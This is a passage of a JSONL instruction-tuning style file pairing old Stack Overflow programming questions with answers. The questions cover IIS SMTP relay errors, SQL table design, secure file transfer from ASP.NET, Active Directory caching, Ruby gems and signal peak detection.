the ISP SMTP-server as they (should) have people monitoring the mail-queues, checking for exploits and updating the mail-software. If you business is developing web-applications it is almost always best to stick with what you do, and let other people do their stuff (eg running mailservers).\nIf you still for some reason want to use you local SMTP server, the first thing would be to rule out the php-part. Try folowing KB153119 and then check you SMTPServer IISlog for errors.\nEDIT2:\nThat KB-article says it is for exchange, but the same commands are used for other SMTP-servers (including IIS) as well, so please try and see if you can send mails using the examples from the article."}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "Sessions are tied to the server AND the domain. Using frameset across domain will cause all kind of breakage because that's just not how it was designed to do. \nTry using apache mod rewrite to create a \"passthrough redirection\", the \"proxy\" flag ([P]) in the rule is the magic flag that you need\nDocumentation at  http://httpd.apache.org/docs/1.3/mod/mod_rewrite.html"}
{"instruction": "Is there a way to enforce constraint checking in MSSQL only when inserting new rows?  I.e. allow the constraints to be violated when removing/updating rows?\nUpdate: I mean FK constraint.", "output": "What sort of constraints?  I'm guessing foreign key constraints, since you imply that deleting a row might violate the constraint.  If that's the case, it seems like you don't really need a constraint per se, since you're not concerned with referential integrity.\nWithout knowing more about your specific situation, I would echo the intent of the other posters, which seems to be \"enforce the insert requirements in your data access layer\".  However, I'd quibble with their implementations.  A trigger seems like overkill and any competent DBA should sternly rap you on the knuckles with a wooden ruler for trying to use a cursor to perform a simple insert.  A stored procedure should suffice."}
{"instruction": "What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?", "output": "I believe that 6 of the 9 licenses on the OSI's list of \"Licenses that are popular and widely used or with strong communities\" meet your criterion: Apache, BSD, MIT, Mozilla, CPL, and Eclipse. The Mozilla license and CPL (the Common Public License) have language concerning patents that might make them more attractive to corporations.\nSee here for more information."}
{"instruction": "Visual Studio is such a massively big product that even after years of working with it I sometimes stumble upon a new/better way to do things or things I didn't even know were possible.\nFor instance-\n\nCrtl + R, Ctrl + W to show white spaces. Essential for editing Python build scripts.\nUnder \"HKEY_CURRENT_USER\\Software\\Microsoft\\VisualStudio\\8.0\\Text Editor\" \nCreate a String called Guides with the value \"RGB(255,0,0), 80\" to have a red line at column 80 in the text editor.\n\nWhat other hidden features have you stumbled upon?", "output": "CTRL-D then type \">of \" then file name.  If the standard toolbar is up crtl-d put you in find combobox and there is now a dropdown with files in your solution that match the start of the filename you typed. Pick one and it will open it.  This alternative to the open filedialog is awesome for big solutions with lots of directories."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "C# Lookup:\nNothing to calculate really, just look it up. To extend it,add another 8 numbers to the table and 64 bit integers are at at their limit. Beyond that, a BigNum class is called for. \npublic static int Factorial(int f)\n{ \n    if (f<0 || f>12)\n    {\n        throw new ArgumentException(\"Out of range for integer factorial\");\n    }\n    int [] fact={1,1,2,6,24,120,720,5040,40320,362880,3628800,\n                 39916800,479001600};\n    return fact[f];\n}"}
{"instruction": "Visual Studio is such a massively big product that even after years of working with it I sometimes stumble upon a new/better way to do things or things I didn't even know were possible.\nFor instance-\n\nCrtl + R, Ctrl + W to show white spaces. Essential for editing Python build scripts.\nUnder \"HKEY_CURRENT_USER\\Software\\Microsoft\\VisualStudio\\8.0\\Text Editor\" \nCreate a String called Guides with the value \"RGB(255,0,0), 80\" to have a red line at column 80 in the text editor.\n\nWhat other hidden features have you stumbled upon?", "output": "Here's an old blog article on some of the hidden debugger features in the expression evaluators."}
{"instruction": "If I've got a table containing Field1 and Field2 can I generate a new field in the select statement? For example, a normal query would be:\nSELECT Field1, Field2 FROM Table\n\nAnd I want to also create Field3 and have that returned in the resultset... something along the lines of this would be ideal:\nSELECT Field1, Field2, Field3 = 'Value' FROM Table\n\nIs this possible at all?", "output": "SELECT Field1, Field2, 'Value' Field3 FROM Table\n\nor for clarity\nSELECT Field1, Field2, 'Value' AS Field3 FROM Table"}
{"instruction": "If I've got a table containing Field1 and Field2 can I generate a new field in the select statement? For example, a normal query would be:\nSELECT Field1, Field2 FROM Table\n\nAnd I want to also create Field3 and have that returned in the resultset... something along the lines of this would be ideal:\nSELECT Field1, Field2, Field3 = 'Value' FROM Table\n\nIs this possible at all?", "output": "Yes - it's very possible, in fact you almost had it!\nTry:\nSELECT Field1, Field2, 'Value' AS `Field3` FROM Table"}
{"instruction": "I'm getting this problem:\nPHP Warning: mail() [function.mail]: SMTP server response: 550 5.7.1 Unable to relay for chris.mahan@gmail.com in c:\\inetpub\\wwwroot\\mailtest.php on line 12 \n\nfrom this script:\n<?php\n$to = \"chris.mahan@gmail.com\";\n$subject = \"test\";\n$body = \"this is a test\";\n\nif (mail($to, $subject, $body)){\n    echo \"mail sent\";\n}\nelse {\n    echo \"problem\";\n}\n?>\n\nsection from php.ini on the server:\n[mail function]\n; For Win32 only.\nSMTP = server.domain.com; for Win32 only\nsmtp_port = 25\n\n; For Win32 only.\nsendmail_from = support@domain.com\n; For Unix only.  You may supply arguments as well (default: \"sendmail -t -i\").\n;sendmail_path =\n\n(note that \"server\" and \"domain\" refer accurately to the actual server and domain name)\nIn IIS, SMTP is running. Under \"Access\" tab, \"Relay\" button, the Select which computers may relay through this virtual server is set to checkbox \"only the list below\" and on the list is \"127.0.0.1(xxx.xxx.xxx.xxx)\" (x's representing actual server IP address).\nServer is running Windows Server 2003 Service Pack 2, fully patched as of 5 PM Sept 1st 2008. I assume it is running IIS7 (how to check?).\nAny ideas?\nIn reponse to Espo: This machine is hosted at a datacenter. We do not want to use a gmail account (were doing it, want to move away from that). Windows server 2003 comes with its own SMTP server.\nUpdate: Per Yaakov Ellis' advice, I dropped all relay restrictions and added the server  IP to the allowed list (using the reverse DNS button provided) and the thing started working.\nThanks to both Espo and Yaakov for helping me out.", "output": "@Espo: I'll do that re KB153119. Thanks.\nAbout the mail server: I hear you. \nI'll update when I uncover more."}
{"instruction": "I'm getting this problem:\nPHP Warning: mail() [function.mail]: SMTP server response: 550 5.7.1 Unable to relay for chris.mahan@gmail.com in c:\\inetpub\\wwwroot\\mailtest.php on line 12 \n\nfrom this script:\n<?php\n$to = \"chris.mahan@gmail.com\";\n$subject = \"test\";\n$body = \"this is a test\";\n\nif (mail($to, $subject, $body)){\n    echo \"mail sent\";\n}\nelse {\n    echo \"problem\";\n}\n?>\n\nsection from php.ini on the server:\n[mail function]\n; For Win32 only.\nSMTP = server.domain.com; for Win32 only\nsmtp_port = 25\n\n; For Win32 only.\nsendmail_from = support@domain.com\n; For Unix only.  You may supply arguments as well (default: \"sendmail -t -i\").\n;sendmail_path =\n\n(note that \"server\" and \"domain\" refer accurately to the actual server and domain name)\nIn IIS, SMTP is running. Under \"Access\" tab, \"Relay\" button, the Select which computers may relay through this virtual server is set to checkbox \"only the list below\" and on the list is \"127.0.0.1(xxx.xxx.xxx.xxx)\" (x's representing actual server IP address).\nServer is running Windows Server 2003 Service Pack 2, fully patched as of 5 PM Sept 1st 2008. I assume it is running IIS7 (how to check?).\nAny ideas?\nIn reponse to Espo: This machine is hosted at a datacenter. We do not want to use a gmail account (were doing it, want to move away from that). Windows server 2003 comes with its own SMTP server.\nUpdate: Per Yaakov Ellis' advice, I dropped all relay restrictions and added the server  IP to the allowed list (using the reverse DNS button provided) and the thing started working.\nThanks to both Espo and Yaakov for helping me out.", "output": "@Espo, the article in question relates to Exchange servers, not IIS7.0 SMTP server.\nFrom the summary: This article describes how to telnet to port 25 on a computer that runs Simple Mail Transfer Protocol (SMTP) services to troubleshoot SMTP communication problems. The information in this article, including error messages, only applies to issues when attempting to resolve SMTP communication issues with Microsoft Exchange-based servers and is not intended for general troubleshooting purposes."}
{"instruction": "I would like to test a string containing a path to a file for existence of that file (something like the -e test in Perl or the os.path.exists() in Python) in C#.", "output": "Use:\nFile.Exists(path)\n\nMSDN: http://msdn.microsoft.com/en-us/library/system.io.file.exists.aspx\nEdit: In System.IO"}
{"instruction": "I would like to test a string containing a path to a file for existence of that file (something like the -e test in Perl or the os.path.exists() in Python) in C#.", "output": "System.IO.File.Exists(path)\nmsdn"}
{"instruction": "I would like to test a string containing a path to a file for existence of that file (something like the -e test in Perl or the os.path.exists() in Python) in C#.", "output": "System.IO\nusing System.IO;\nif (File.Exists(path)) \n{\n    Console.WriteLine(\"file exists\");\n}"}
{"instruction": "I'm getting this problem:\nPHP Warning: mail() [function.mail]: SMTP server response: 550 5.7.1 Unable to relay for chris.mahan@gmail.com in c:\\inetpub\\wwwroot\\mailtest.php on line 12 \n\nfrom this script:\n<?php\n$to = \"chris.mahan@gmail.com\";\n$subject = \"test\";\n$body = \"this is a test\";\n\nif (mail($to, $subject, $body)){\n    echo \"mail sent\";\n}\nelse {\n    echo \"problem\";\n}\n?>\n\nsection from php.ini on the server:\n[mail function]\n; For Win32 only.\nSMTP = server.domain.com; for Win32 only\nsmtp_port = 25\n\n; For Win32 only.\nsendmail_from = support@domain.com\n; For Unix only.  You may supply arguments as well (default: \"sendmail -t -i\").\n;sendmail_path =\n\n(note that \"server\" and \"domain\" refer accurately to the actual server and domain name)\nIn IIS, SMTP is running. Under \"Access\" tab, \"Relay\" button, the Select which computers may relay through this virtual server is set to checkbox \"only the list below\" and on the list is \"127.0.0.1(xxx.xxx.xxx.xxx)\" (x's representing actual server IP address).\nServer is running Windows Server 2003 Service Pack 2, fully patched as of 5 PM Sept 1st 2008. I assume it is running IIS7 (how to check?).\nAny ideas?\nIn reponse to Espo: This machine is hosted at a datacenter. We do not want to use a gmail account (were doing it, want to move away from that). Windows server 2003 comes with its own SMTP server.\nUpdate: Per Yaakov Ellis' advice, I dropped all relay restrictions and added the server  IP to the allowed list (using the reverse DNS button provided) and the thing started working.\nThanks to both Espo and Yaakov for helping me out.", "output": "Try removing the IP restrictions for Relaying in the SMTP server, and opening it up to all relays. If it works when this is set, then you know that the problem has to do with the original restrictions. In this case, it may be a DNS issue, or perhaps you had the wrong IP address listed."}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "Stating your requirement/spec might help arrive at the 'best design'.\nYour question is too 'subject-to-reader-interpretation' at the moment."}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "Here's a scenario you should think about:\nComposition (the 2nd example) is preferable if the same User can be both an Employee and a Member. Why? Because for two instances (Employee and Member) that represent the same User, if User data changes, you don't have to update it in two places. Only the User instance contains all the User information, and only it has to be updated. Since both Employee and Member classes contain the same User instance, they will automatically both contain the updated information."}
{"instruction": "I have the following tables in my database that have a many-to-many relationship, which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tables:\n\nWidget: WidgetID (PK), Title, Price  \nUser: UserID (PK), FirstName, LastName\n\nAssume that each User-Widget combination is unique. I can see two options for how to structure the connecting table that defines the data relationship:\n\nUserWidgets1: UserWidgetID (PK), WidgetID (FK), UserID (FK)  \nUserWidgets2: WidgetID (PK, FK), UserID (PK, FK)\n\nOption 1 has a single column for the Primary Key. However, this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables, and this relationship itself can form a unique key. Thus leading to option 2, which has a two-column primary key, but loses the one-column unique identifier that option 1 has. I could also optionally add a two-column unique index (WidgetID, UserID) to the first table.\nIs there any real difference between the two performance-wise, or any reason to prefer one approach over the other for structuring the UserWidgets many-to-many table?", "output": "I agree with the previous answers but I have one remark to add.\nIf you want to add more information to the relation and allow more relations between the same two entities you need option one. \nFor example if you want to track all the times user 1 has used widget 664 in the userwidget table the userid and widgetid isn't unique anymore."}
{"instruction": "What are some standard practices for managing a medium-large JavaScript application? My concerns are both speed for browser download and ease and maintainability of development.\nOur JavaScript code is roughly \"namespaced\" as:\nvar Client = {\n   var1: '',\n   var2: '',\n\n   accounts: {\n      /* 100's of functions and variables */\n   },\n\n   orders: {\n      /* 100's of functions and variables and subsections */\n   }\n\n   /* etc, etc  for a couple hundred kb */\n}\n\nAt the moment, we have one (unpacked, unstripped, highly readable) JavaScript file to handle all the business logic on the web application. In addition, there is jQuery and several jQuery extensions. The problem we face is that it takes forever to find anything in the JavaScript code and the browser still has a dozen files to download.\nIs it common to have a handful of \"source\" JavaScript files that gets \"compiled\" into one final, compressed JavaScript file? Any other handy hints or best practices?", "output": "Also, I suggest you to use Google's AJAX Libraries API in order to load external libraries. \nIt's a Google developer tool which bundle majors JavaScript libraries and make it easier to deploy, upgrade and make them lighter by always using compressed versions.\nAlso, it make your project simpler and lighter because you don't need to download, copy and maintain theses libraries files in your project.\nUse it this way :\ngoogle.load(\"jquery\", \"1.2.3\");\ngoogle.load(\"jqueryui\", \"1.5.2\");\ngoogle.load(\"prototype\", \"1.6\");\ngoogle.load(\"scriptaculous\", \"1.8.1\");\ngoogle.load(\"mootools\", \"1.11\");\ngoogle.load(\"dojo\", \"1.1.1\");"}
{"instruction": "I am considering log-shipping of Write Ahead Logs (WAL) in PostgreSQL to create a warm-standby database. However I have one table in the database that receives a huge amount of INSERT/DELETEs each day, but which I don't care about protecting the data in it. To reduce the amount of WALs produced I was wondering, is there a way to prevent any activity on one table from being recorded in the WALs?", "output": "Unfortunately, I don't believe there is. The WAL logging operates on the page level, which is much lower than the table level and doesn't even know which page holds data from which table. In fact, the WAL files don't even know which pages belong to which database.\nYou might consider moving your high activity table to a completely different instance of PostgreSQL. This seems drastic, but I can't think of another way off the top of my head to avoid having that activity show up in your WAL files."}
{"instruction": "Recently I have been having issues with Firefox 3 on Ubuntu Hardy Heron.\nI will click on a link and it will hang for a while.  I don't know if its a bug in Firefox 3 or a page running too much client side JavaScript, but I would like to try and debug it a bit.\nSo, my question is \"is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?\"\nI would like to be able to see what tabs are using what percent of my processor via the JavaScript on that page (or anything in the page that is causing CPU/memory usage).  \nDoes anybody know of a plugin that does this, or something similar?  Has anyone else done this kind of inspection another way?\nI know about FireBug, but I can't imagine how I would use it to finger which tab is using a lot of resources.\nAny suggestions or insights?", "output": "So, my question is, is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?\n\nBecause of the way Firefox is built this is not possible at the moment. But the new Internet Explorer 8 Beta 2 and the just announced Google Chrome browser are heading in that direction, so I suppose Firefox will be heading there too.\nHere is a post (  Google Chrome Process Manager  ),by John Resig from Mozilla and jQuery fame on the subject."}
{"instruction": "We need to move off traditional FTP for security purposes (it transmits it's passwords unencrypted). I am hearing SSH touted as the obvious alternative. However I have been driving FTP from an ASP.NET program interface to automate my web-site development, which is now quite a highly web-enabled process. \nCan anyone recommend a secure way to transfer files around which has a program interface that I can drive from ASP.NET?", "output": "We have used a variation of this solution in the past which uses the SSH Factory for .NET"}
{"instruction": "We need to move off traditional FTP for security purposes (it transmits it's passwords unencrypted). I am hearing SSH touted as the obvious alternative. However I have been driving FTP from an ASP.NET program interface to automate my web-site development, which is now quite a highly web-enabled process. \nCan anyone recommend a secure way to transfer files around which has a program interface that I can drive from ASP.NET?", "output": "sharpssh implements sending files via scp."}
{"instruction": "In one of my applications, I am querying active directory to get a list of all users below a given user (using the \"Direct Reports\" thing). So basically, given the name of the person, it is looked up in AD, then the Direct Reports are read. But then for every direct report, the tool needs to check the direct reports of the direct reports. Or, more abstract: The Tool will use a person as the root of the tree and then walk down the complete tree to get the names of all the leaves (can be several hundred)\nNow, my concern is obviously performance, as this needs to be done quite a few times. My idea is to manually cache that (essentially just put all the names in a long string and store that somewhere and update it once a day).\nBut I just wonder if there is a more elegant way to first get the information and then cache it, possibly using something in the System.DirectoryServices Namespace?", "output": "In order to take control over the properties that you want to be cached you can call 'RefreshCache()' passing the properties that you want to hang around:\nSystem.DirectoryServices.DirectoryEntry entry = new System.DirectoryServices.DirectoryEntry();               \n\n// Push the property values from AD back to cache.\n\nentry.RefreshCache(new string[] {\"cn\", \"www\" });"}
{"instruction": "We need to move off traditional FTP for security purposes (it transmits it's passwords unencrypted). I am hearing SSH touted as the obvious alternative. However I have been driving FTP from an ASP.NET program interface to automate my web-site development, which is now quite a highly web-enabled process. \nCan anyone recommend a secure way to transfer files around which has a program interface that I can drive from ASP.NET?", "output": "G'day,\nYou might like to look at ProFPD.\nHeavily customisable. Based on Apache module structure.\nFrom their web site:\n\nProFTPD grew out of the desire to have a secure and configurable FTP server, and out of a significant admiration of the Apache web server.\n\nWe use our adapted version for large scale transfer of web content. Typically 300,000 updates per day.\nHTH\ncheers,\nRob"}
{"instruction": "In one of my applications, I am querying active directory to get a list of all users below a given user (using the \"Direct Reports\" thing). So basically, given the name of the person, it is looked up in AD, then the Direct Reports are read. But then for every direct report, the tool needs to check the direct reports of the direct reports. Or, more abstract: The Tool will use a person as the root of the tree and then walk down the complete tree to get the names of all the leaves (can be several hundred)\nNow, my concern is obviously performance, as this needs to be done quite a few times. My idea is to manually cache that (essentially just put all the names in a long string and store that somewhere and update it once a day).\nBut I just wonder if there is a more elegant way to first get the information and then cache it, possibly using something in the System.DirectoryServices Namespace?", "output": "Depends on how up to date you want the information to be.  If you must have the very latest data in your report then querying directly from AD is reasonable.  And I agree that AD is quite robust, a typical dedicated AD server is actually very lightly utilised in normal day to day operations but best to check with your IT department / support person.\nAn alternative is to have a daily script to dump the AD data into a CSV file and/or import it into a SQL database.  (Oracle has a SELECT CONNECT BY feature that can automatically create multi-level hierarchies within a result set.  MSSQL can do a similar thing with a bit of recursion IIRC)."}
{"instruction": "I'm not sure of all of them, but what are the commands to do things like update Ruby, download a new gem, or update an existing gem? What other important things are there?\nSince it might matter, I'm running Windows.", "output": "Useful command: Rake\nIn addition to the commands listed by Joseph Pecoraro, the 'rake' command is also pretty standard when working with Ruby. Rake makes it easy to automate (simple) tasks; like building a RubyGem or running your unit tests.\nWith rake, the only important command to remember is 'rake -T', which shows a list of rake tasks available in the current directory.\nUpdating a Ruby gem\nTo get back to your specific question:\nTo update a specific gem, you can do two things: simply update the gem:\ngem update <gemname>\n\nThis will update the gem to the latest version. \nInstall a Ruby gem\nIf you want to update to a specific version, you must install it:\ngem install <gemname> -v <gemversion>\n\nYou can leave out the -v options. Rubygems then installs the latest version.\nHow to help yourself\nTwo useful gem commands to remember are:\ngem help\n\nThis shows how to get help with rubygems.\ngem help commands\n\nThis shows all commands available to rubygems.\nFrom here you can get more specific help on a command by using gem help:\ngem help update"}
{"instruction": "I have the following tables in my database that have a many-to-many relationship, which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tables:\n\nWidget: WidgetID (PK), Title, Price  \nUser: UserID (PK), FirstName, LastName\n\nAssume that each User-Widget combination is unique. I can see two options for how to structure the connecting table that defines the data relationship:\n\nUserWidgets1: UserWidgetID (PK), WidgetID (FK), UserID (FK)  \nUserWidgets2: WidgetID (PK, FK), UserID (PK, FK)\n\nOption 1 has a single column for the Primary Key. However, this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables, and this relationship itself can form a unique key. Thus leading to option 2, which has a two-column primary key, but loses the one-column unique identifier that option 1 has. I could also optionally add a two-column unique index (WidgetID, UserID) to the first table.\nIs there any real difference between the two performance-wise, or any reason to prefer one approach over the other for structuring the UserWidgets many-to-many table?", "output": "Personally, I would have the synthetic/surrogate key column in many-to-many tables for the following reasons:\n\nIf you've used numeric synthetic keys in your entity tables then having the same on the relationship tables maintains consistency in design and naming convention.\nIt may be the case in the future that the many-to-many table itself becomes a parent entity to a subordinate entity that needs a unique reference to an individual row.\nIt's not really going to use that much additional disk space.\n\nThe synthetic key is not a replacement to the natural/compound key nor becomes the PRIMARY KEY for that table just because it's the first column in the table, so I partially agree with the Josh Berkus article.  However, I don't agree that natural keys are always good candidates for PRIMARY KEY's and certainly should not be used if they are to be used as foreign keys in other tables."}
{"instruction": "We need to move off traditional FTP for security purposes (it transmits it's passwords unencrypted). I am hearing SSH touted as the obvious alternative. However I have been driving FTP from an ASP.NET program interface to automate my web-site development, which is now quite a highly web-enabled process. \nCan anyone recommend a secure way to transfer files around which has a program interface that I can drive from ASP.NET?", "output": "The traditional secure replacement for FTP is SFTP, but if you have enough control over both endpoints, you might consider rsync instead: it is highly configurable, secure just by telling it to use ssh, and far more efficient for keeping two locations in sync."}
{"instruction": "I have lots of article store in MS SQL server 2005 database in a table called Articles-\n\"Articles (ArticleID, ArticleTitle, ArticleContent)\"\n\nNow I want some SP or SQL query which could return me similar Article against any user's input (very much like \"Similar Posts\" in blogs OR \"Related Questions\" in stackoverflow). The matching should work on both ArticleTitle and ArticleContent. The query should be intelligent enough to sort the result on the basis on their relevancy.\nIs it possible to do this in MS SQL Server 2005?", "output": "First of all you need to define what article similarity means.\nFor example you can associate some meta information with articles, like tags.\nTo be able to find similar articles you need to extract some features from them, for example you can build full text index.\nYou can take advantage of full text search capability of MSSQL 2005\n-- Assuming @Title contains title of current articles you can find related articles runnig this query  \nSELECT * FROM Acticles WHERE CONTAINS(ArticleTitle, @Title)"}
{"instruction": "I have lots of article store in MS SQL server 2005 database in a table called Articles-\n\"Articles (ArticleID, ArticleTitle, ArticleContent)\"\n\nNow I want some SP or SQL query which could return me similar Article against any user's input (very much like \"Similar Posts\" in blogs OR \"Related Questions\" in stackoverflow). The matching should work on both ArticleTitle and ArticleContent. The query should be intelligent enough to sort the result on the basis on their relevancy.\nIs it possible to do this in MS SQL Server 2005?", "output": "I think the question is what 'similar' means to you. If you create a field for user to input some kind of tags, it becomes much more easier to query."}
{"instruction": "I have the following tables in my database that have a many-to-many relationship, which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tables:\n\nWidget: WidgetID (PK), Title, Price  \nUser: UserID (PK), FirstName, LastName\n\nAssume that each User-Widget combination is unique. I can see two options for how to structure the connecting table that defines the data relationship:\n\nUserWidgets1: UserWidgetID (PK), WidgetID (FK), UserID (FK)  \nUserWidgets2: WidgetID (PK, FK), UserID (PK, FK)\n\nOption 1 has a single column for the Primary Key. However, this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables, and this relationship itself can form a unique key. Thus leading to option 2, which has a two-column primary key, but loses the one-column unique identifier that option 1 has. I could also optionally add a two-column unique index (WidgetID, UserID) to the first table.\nIs there any real difference between the two performance-wise, or any reason to prefer one approach over the other for structuring the UserWidgets many-to-many table?", "output": "Option 2 uses a simple compund key, option 1 uses a surrogate key.  Option 2 is preferred in most scenarios and is close to the lreational model in that it is a good candidate key.\nThere are situations where you may want to use a surrogate key (Option 1)\n\nYou are not that the compound key is a good candidate key over time.  Particularly with temporal data (data that changes over time).  What if you wanted to add another row to the UserWidget table with the same UserId and WidgetId?  Think of Employment(EmployeeId,EmployeeId) - it would work in most cases except if someone went back to work for the same employer at a later date\nIf you are creating messages/business transactions or something similar that require an easier key to use for integration.  Replication maybe?\nIf you want to create your own auditing mechanisms (or similar) and don't want keys to get too long.\n\nAs a rule of thumb, when modeling data you will find that most associative entities (many to many) are the result of an event.  Person takes up employment, item is added to basket etc.  Most events have a temporal dependency on the event, where the date or time is relevant - in which case a surrogate key may be the best alternative.\nSo, take option 2, but make sure that you have the complete model."}
{"instruction": "I have lots of article store in MS SQL server 2005 database in a table called Articles-\n\"Articles (ArticleID, ArticleTitle, ArticleContent)\"\n\nNow I want some SP or SQL query which could return me similar Article against any user's input (very much like \"Similar Posts\" in blogs OR \"Related Questions\" in stackoverflow). The matching should work on both ArticleTitle and ArticleContent. The query should be intelligent enough to sort the result on the basis on their relevancy.\nIs it possible to do this in MS SQL Server 2005?", "output": "Something like this might work, a kind of ranking system. You would probably have to split the string in your application to build a SQL string, but I have used similar to build an effective site search.\nSelect\nTop 10\nArticleID,\nArticleTitle,\nArticleContent\nFrom\nArticles\nOrder By\n(Case When ArticleTitle = 'Article Title' Then 1 Else 0 End) Desc,\n(Case When ArticleTitle = 'Article' Then 1 Else 0 End) Desc,\n(Case When ArticleTitle = 'Title' Then 1 Else 0 End) Desc,\n(Case When Soundex('Article Title') = Soundex(ArticleTitle) Then 1 Else 0 End) Desc,\n(Case When Soundex('Article') = Soundex(ArticleTitle) Then 1 Else 0 End) Desc,\n(Case When Soundex('Title') = Soundex(ArticleTitle) Then 1 Else 0 End) Desc,\n(Case When PatIndex('%Article%Title%', ArticleTitle) > 0 Then 1 Else 0 End) Desc,\n(Case When PatIndex('%Article%', ArticleTitle) > 0 Then 1 Else 0 End) Desc,\n(Case When PatIndex('%Title%', ArticleTitle) > 0 Then 1 Else 0 End) Desc,\n(Case When PatIndex('%Article%Title%', ArticleContent) > 0 Then 1 Else 0 End) Desc,\n(Case When PatIndex('%Article%', ArticleContent) > 0 Then 1 Else 0 End) Desc,\n(Case When PatIndex('%Title%', ArticleContent) > 0 Then 1 Else 0 End) Desc\n\nYou can then add/remove case statements from the order by clause to improve the list based on your data."}
{"instruction": "I have developed some classes with similar behavior, they all implement the same interface.  I implemented a factory that creates the appropriate object and returns the interface.  I am writing a unit test for the factory.  All you get back is an interface to the object.\nWhat is the best way to test that the factory has worked correctly?\nI would like to know the answer in Java, but if there is a solution that crosses languages I would like to know it.\nNumber 2. in the answer, would be done like the other answer?  If so I will mark the other answer accepted as well and reword my question to adress both a factory where an interface is returned and you have no clue what type of concrete class implemented the interface, and the case where you do know what concrete class was used.", "output": "@cem-catikkas I think it would be more correct to compare the getClass().getName() values. In the case that MyInterfaceImpl1 class is subclassed your test could be broken, as the subclass is instanceof MyInterfaceImpl1. I would rewrite as follow:\nIMyInterface fromFactory = factory.create(...);  \nAssert.assertEquals(fromFactory.getClass().getName(), MyInterfaceImpl1.class.getName());\n\nIf you think this could fail in some way (I can't imagine), make the two verifications."}
{"instruction": "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code.", "output": "Is there a qualitative difference between the desired peak and the unwanted second peak? If both peaks are \"sharp\" -- i.e. short in time duration -- when looking at the signal in the frequency domain (by doing FFT) you'll get energy at most bands. But if the \"good\" peak reliably has energy present at frequencies not existing in the \"bad\" peak, or vice versa, you may be able to automatically differentiate them that way."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Peopleware: Productive Projects and Teams\nby Tom DeMarco and Timothy Lister\n\nThis classic book encourages us to think about the people instead of the process. It's full of practical advice on team building, productivity and office environments. It's a must read, not just for managers, but anyone related to software development. \nGet two copies, one for you and one for your manager."}
